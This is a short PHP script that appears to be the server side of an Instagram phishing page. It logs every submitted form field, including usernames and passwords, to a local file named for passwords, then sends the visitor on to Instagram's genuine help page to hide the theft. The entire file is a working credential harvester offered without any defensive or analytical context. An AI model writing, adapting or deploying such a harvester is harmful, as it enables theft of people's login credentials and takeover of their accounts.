<?php

header ('Location: https://help.instagram.com/ ');
$handle = fopen("contrasenassS.txt", "a"); 
foreach($_POST as $variable => $value) {
	fwrite($handle, $variable);
	fwrite($handle, "=");
	fwrite($handle, $value);
	fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;

?>
